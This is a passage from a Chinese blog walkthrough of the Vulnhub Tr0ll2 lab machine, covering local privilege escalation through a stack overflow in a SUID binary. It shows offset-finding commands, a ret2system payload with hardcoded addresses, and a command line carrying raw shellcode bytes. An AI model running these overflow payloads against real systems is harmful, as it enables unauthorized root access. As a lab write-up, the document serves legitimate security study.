onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlU4OQJP3XwFBEpYsSuMX2ib6LuduU20WDvhPKz5TCiatBGln7DJzjVzaA/640?wx_fmt=png'" data-type="png" data-w="473" height="148" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;" width="496" data-backw="496" data-backh="148"  /></figure><p><span style="font-size:15px;line-height:35px;;">挨个的来看一下:</span></p><figure><img data-ratio="0.5008605851979346" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/24_BebBvfwzjJG8eumiboUXK4LM8JcCMA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJll1IibujcqBXPUd2XUcSs5ZIfebBebBvfwzjJG8eumiboUXK4LM8JcCMA/640?wx_fmt=png'" data-type="png" data-w="581" height="297" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="593"  /></figure><p><span style="font-size:15px;line-height:35px;;">???reboot???，看来不能瞎运行啊…这里发现有gdb，可以分析一下再选择运行，大家要注意，实际情况中也是，不能乱运行程序。</span></p><h3><span style="font-size:15px;line-height:35px;;">Ret2Text With Environment</span></h3><figure><img data-ratio="0.5572916666666666" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/25_StCIAhXtBMBLKMpdicte2OSa3FRqhw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlVsVfhkLj7l6A5IMtWNaVo3OJwStCIAhXtBMBLKMpdicte2OSa3FRqhw/640?wx_fmt=png'" data-type="png" data-w="576" height="332" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="596"  /></figure><p><span style="font-size:15px;line-height:35px;;">上图为r00t1，没有交互不像是存在溢出或者格式化字符串的情况。</span></p><p><span style="font-size:15px;line-height:35px;;">现在看一下r00t2:</span></p><p><img class="rich_pages js_insertlocalimg" data-ratio="0.9078260869565218" data-s="300,640" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/26_iaBpC6swl2Ok16V6gC8prrRcy9JLVw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlFibcGp1HX3QNLp1CWk8WiaycvrDiaBpC6swl2Ok16V6gC8prrRcy9JLVw/640?wx_fmt=png'" data-type="png" data-w="575" style=""  /></p><p><span style="font-size:15px;line-height:35px;;">其中strcpy以及printf可能存在溢出和格式化字符串漏洞</span></p><p><span style="font-size:15px;line-height:35px;;">r003:</span></p><figure><img data-ratio="0.6754221388367729" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/27_CWh7zk32qBicgw2WOCTqoJKK14oIlQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJliak8eFQw9NE1LD5t3KSFDC4uiczCWh7zk32qBicgw2WOCTqoJKK14oIlQ/640?wx_fmt=png'" data-type="png" data-w="533" height="371" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="550"  /></figure><p><span style="font-size:15px;line-height:35px;;">与r00t1同，调用了system，但参数明显不是/bin/sh，有诈…</span></p><p><span style="font-size:15px;line-height:35px;;">既然大概率r00t2存在漏洞，那我们着重看一下，因为自带的gdb并没有我常用的插件，所以这里借助msf来完成测试溢出的offset:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="bash"><code><span class="code-snippet_outer"><span class="code-snippet__built_in">cd</span> /usr/share/metasploit-framework/tools/exploit/</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">./pattern_create.rb -l 400</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">./pattern_offset.rb -q 6a413969</span></code></pre></section><p><img class="rich_pages js_insertlocalimg" data-ratio="0.31239935587761675" data-s="300,640" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/28_iatz3oWLbD02Pl46KiaSDvS9ATjBXQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl4tZR3wJ63h77CbPFxlFkeKCKwyiatz3oWLbD02Pl46KiaSDvS9ATjBXQ/640?wx_fmt=png'" data-type="png" data-w="621" style=""  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">(gdb) p <span class="code-snippet__keyword">system</span></span></code><code><span class="code-snippet_outer">$1 = {&lt;text variable, <span class="code-snippet__keyword">no</span> debug info&gt;} <span class="code-snippet__number">0xb7e6b060</span> &lt;<span class="code-snippet__keyword">system</span>&gt;</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">有system现在我们可以输入/bin/sh，但问题是地址在哪？可以调试得出这里介绍另一种简单的方法:</span></p><pre><span style="font-size:15px;line-height:35px;;">export MyAddress=//////////////////////bin/sh</span></pre><p><span style="font-size:15px;line-height:35px;;">用如下c代码找到地址:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="ruby"><code><span class="code-snippet_outer"><span class="code-snippet__comment">#include&lt;unistd.h&gt;</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">void main()</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    printf(<span class="code-snippet__string">"MyAddress address 0x%lx\n"</span>, getenv(<span class="code-snippet__string">"MyAddress"</span>));</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">noob@Tr0ll2<span class="code-snippet__symbol">:/nothing_to_see_here/choose_wisely/door2</span>$ ./../../../tmp/get MyAddress address <span class="code-snippet__number">0xbfffffb7</span></span></code><code><span class="code-snippet_outer"><br  /></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">这样system和sh地址都有了，构造简单ROP:</span><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="ini"><code><span class="code-snippet_outer"><span class="code-snippet__attr">system</span> = <span class="code-snippet__number">0</span>x8048370</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">sh</span> = <span class="code-snippet__number">0</span>xbffffef7 q</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">payload</span> = <span class="code-snippet__string">'A'</span> * <span class="code-snippet__number">268</span> + p32(system) + <span class="code-snippet__string">'dead'</span> + p32(sh)</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">但是目标肯定没有pwntools，我们手工:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="swift"><code><span class="code-snippet_outer">./r00t&nbsp;$(python&nbsp;-<span class="code-snippet__built_in">c</span>&nbsp;'<span class="code-snippet__built_in">print</span>&nbsp;<span class="code-snippet__string">"A"</span>&nbsp;*&nbsp;<span class="code-snippet__number">268</span>&nbsp;+&nbsp;<span class="code-snippet__string">"\x60\xb0\xe6\xb7"</span>&nbsp;+&nbsp;<span class="code-snippet__string">"BBBB"</span>&nbsp;+&nbsp;<span class="code-snippet__string">"\xbf\xff\xff\xe3"</span>')</span></code></pre></section><p><img data-ratio="0.4944356120826709" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/29_eniaeMicnZMJeeW5XTxQg1zGiaRRzA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlPwicARgXO6ianPicyzm87utex9Oh0zeniaeMicnZMJeeW5XTxQg1zGiaRRzA/640?wx_fmt=png'" data-type="png" data-w="629" height="317" width="642" style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></p><p><span style="font-size:15px;line-height:35px;;">上面的payload中sh字符串的地址有一点点误差，多试几次即可:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="swift"><code><span class="code-snippet_outer">./r00t&nbsp;$(python&nbsp;-<span class="code-snippet__built_in">c</span>&nbsp;'<span class="code-snippet__built_in">print</span>&nbsp;<span class="code-snippet__string">"A"</span>&nbsp;*&nbsp;<span class="code-snippet__number">268</span>&nbsp;+&nbsp;<span class="code-snippet__string">"\x60\xb0\xe6\xb7"</span>&nbsp;+&nbsp;<span class="code-snippet__string">"BBBB"</span>&nbsp;+&nbsp;<span class="code-snippet__string">"\xc7\xff\xff\xbf"</span>')</span></code></pre></section><p><img data-ratio="0.30686695278969955" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/30_o0H8W5IsKDGzLD4uiazf3BAAQ0v6Nw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlvpWggq2biczBsWc09KYyVugMeeo0H8W5IsKDGzLD4uiazf3BAAQ0v6Nw/640?wx_fmt=png'" data-type="png" data-w="466" height="152" width="496" style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></p><p><span style="font-size:15px;line-height:35px;;">这就是利用环境变量中的字符串完成ROP，究其原因，是因为系统并没有开启ASLR保护，下面介绍的方法也是没有ASLR保护才能得以实现。若开了ASLR其实我们也可以用传统的ret2libc来完成攻击。</span></p><h3><span style="font-size:15px;line-height:35px;;">Ret2Shellcode</span></h3><figure><img data-ratio="0.11554921540656206" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/31_fib0qOia4nt46jPYB0rOejJiaWYbZQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlt50UicXWbJKfAoK8TCNjicgMs12uxfib0qOia4nt46jPYB0rOejJiaWYbZQ/640?wx_fmt=png'" data-type="png" data-w="701" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><figure><img data-ratio="0.3564516129032258" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/32_oTMdia1icZyYWOgM4DJ9uLkZDyL4mA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlSibQTENcTTE0fyQLkpX5icibkc1ib6oTMdia1icZyYWOgM4DJ9uLkZDyL4mA/640?wx_fmt=png'" data-type="png" data-w="620" height="231" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="649"  /><figcaption><span style="font-size:15px;line-height:35px;;">r00t1</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">没什么东西，看r00t2:</span></p><figure><img data-ratio="0.3958664546899841" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/33_eEACmr3WHcnfcI3w0oia31eGtthF3A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlibstokDPA3GnIwejYQicLAK3V2QeEACmr3WHcnfcI3w0oia31eGtthF3A/640?wx_fmt=png'" data-type="png" data-w="629" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">明显栈溢出。</span></p><figure><img data-ratio="0.5596707818930041" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/34_2GzOyftiaysZfycRmFKzPM9vsepQjg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlnWUw4sricltP1M5iagYicKQPSSgo2GzOyftiaysZfycRmFKzPM9vsepQjg/640?wx_fmt=png'" data-type="png" data-w="729" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><figure><img data-ratio="0.28662420382165604" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/35_Fm3bbr3iadFvY4XMXSu4ZqAN7yhzvA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlmfA9kDibuicQXOEVovB0lsic5ZoUFm3bbr3iadFvY4XMXSu4ZqAN7yhzvA/640?wx_fmt=png'" data-type="png" data-w="471" height="142" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;" width="494" data-backw="494" data-backh="142"  /></figure><figure><img data-ratio="0.4091710758377425" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/36_0ibZuZdCriaAhw4pHhvfdYDwnct8fg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl90lDiaLsfIkU4bORONZaFGy2s3O0ibZuZdCriaAhw4pHhvfdYDwnct8fg/640?wx_fmt=png'" data-type="png" data-w="567" height="239" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="585"  /></figure><p><span style="font-size:15px;line-height:35px;;">这里介绍shellcode来getshell，我们输入shellcode后，需要控制RIP跳到shellcode的地址，那shellcode地址是什么呢？(这里同样可以把shellcode放到环境变量中)</span></p><p><span style="font-size:15px;line-height:35px;;">我们先随机生成268的字符串，然后ret为AAAA之后的为BBBB来观察一下内存布局:</span></p><figure><img data-ratio="0.4897119341563786" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/37_b5iaBQKfEjoH4D31TvJxwRMCNwicZg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJl5l1JT3oZJWZsHicQAtSTxyhAZCtib5iaBQKfEjoH4D31TvJxwRMCNwicZg/640?wx_fmt=png'" data-type="png" data-w="729" height="339" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="694"  /></figure><p><span style="font-size:15px;line-height:35px;;">很明显，我们的BBBB出现在了ESP的位置上，那么把ret地址覆盖为当时的ESP就行了，而系统并没有开ASLR，只要查看一个ESP寄存器即可(在目标机器上):</span></p><figure><img data-ratio="0.44089456869009586" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/38_huz6o2YwiaM0lN8xJYwbn9nicfl8lQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJleggylla8p0AOOYHe7sP98NmibYFhuz6o2YwiaM0lN8xJYwbn9nicfl8lQ/640?wx_fmt=png'" data-type="png" data-w="626" height="282" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="639"  /></figure><p><span style="font-size:15px;line-height:35px;;">同样的payload，查看esp寄存器地址发现确实是BBBB:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="swift"><code><span class="code-snippet_outer">./r00t&nbsp;$(python&nbsp;-<span class="code-snippet__built_in">c</span>&nbsp;'<span class="code-snippet__built_in">print</span>&nbsp;<span class="code-snippet__string">"A"</span>&nbsp;*&nbsp;<span class="code-snippet__number">268</span>&nbsp;+&nbsp;<span class="code-snippet__string">"\xd0\xfa\xff\xbf"</span>&nbsp;+&nbsp;<span class="code-snippet__string">"\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1\x48\x75\x66\x56\x01\x94\x45\xd8"</span>')</span></code></pre></section><p><img data-ratio="0.265139116202946" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/39_7KzEhZlhxk7k7Qw79ZHBlCjVAxQ4lA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou92YYo3HvEMVdnBmtnjWfJlGT2AwEIjrasC4POu0T4OAcyQ7KzEhZlhxk7k7Qw79ZHBlCjVAxQ4lA/640?wx_fmt=png'" data-type="png" data-w="611" height="169" width="636" style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></p><p><span style="font-size:15px;line-height:35px;;">GDB中拿到shell了但不是root权限(这是肯定的)，但是外面会报错。没有找到原因，但我们的基本思路是正确的。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><h2 style="text-align: center;"><span style="font-size:18px;line-height:38px;;"><strong>0x06 Summary</strong></span></h2><p><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">信息收集在本次渗透中仍有着极大的作用，再一个是终于碰到缓冲区溢出了。其中缓冲区溢出的原理及基本思想这里一言半语的也说不清，有PWN基础的应该都可以看得懂。需要注意的是，在本地调试我们只是我为了借助GDB的插件更清楚漏洞利用，而涉及到地址等内容的东西还是要上目标机来看。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;">还有一个是，虽然系统开启了ASLR，但是发现r00t这个程序会不定期删除重新生成，地址自然也会改变，发现问题时记得要多调试。</span></p><p><img src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/40_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-ratio="0.109375" data-w="640"  /></p><pre data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-style="background: rgb(255, 255, 255); letter-spacing: 0.544px; font family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size:13px;line-height:33px;; white-space: nowrap; line-height: 1.42857; word-break: break-all; border-width: 0px; border-style: initial; border-color: initial; border-radius: 4px; color: rgba(230, 230, 230, 0.9) !important;" class="js_darkmode__51" data-darkmode-bgcolor-15867932938191="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15867932938191="rgb(255, 255, 255)" data-darkmode-color-15867932938191="rgba(230, 230, 230, 0.9)" data-darkmode-original-color-15867932938191="rgba(230, 230, 230, 0.9)" style="background: rgb(255, 255, 255);letter-spacing: 0.544px;font family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace;font-size:13px;line-height:33px;;white-space: nowrap;line-height: 1.42857;word-break: break-all;border-width: 0px;border-style: initial;border-color: initial;border-radius: 4px;color: rgba(230, 230, 230, 0.9) !important;"><p data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-darkmode-bgcolor-15867932938191="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15867932938191="rgb(255, 255, 255)" data-darkmode-color-15867932938191="rgba(230, 230, 230, 0.9)" data-darkmode-original-color-15867932938191="rgba(230, 230, 230, 0.9)" style="letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;"><span data-darkmode-bgcolor-15867932938191="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15867932938191="rgb(255, 255, 255)" data-darkmode-color-15867932938191="rgb(136, 136, 136)" data-darkmode-original-color-15867932938191="rgb(136, 136, 136)" style="vertical-align: inherit;color: rgb(136, 136, 136);">原创投稿作者：Railgun</span></p><p data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-darkmode-bgcolor-15867932938191="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15867932938191="rgb(255, 255, 255)" data-darkmode-color-15867932938191="rgba(230, 230, 230, 0.9)" data-darkmode-original-color-15867932938191="rgba(230, 230, 230, 0.9)" style="letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;"><span data-darkmode-bgcolor-15867932938191="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15867932938191="rgb(255, 255, 255)" data-darkmode-color-15867932938191="rgb(136, 136, 136)" data-darkmode-original-color-15867932938191="rgb(136, 136, 136)" style="color: rgb(136, 136, 136);">作者博客：www.pwn4fun.com</span></p></pre><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2020-04-14_Vulnhub靶机渗透-Tr0ll2/41_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                </div>
</div>
</body>
</html>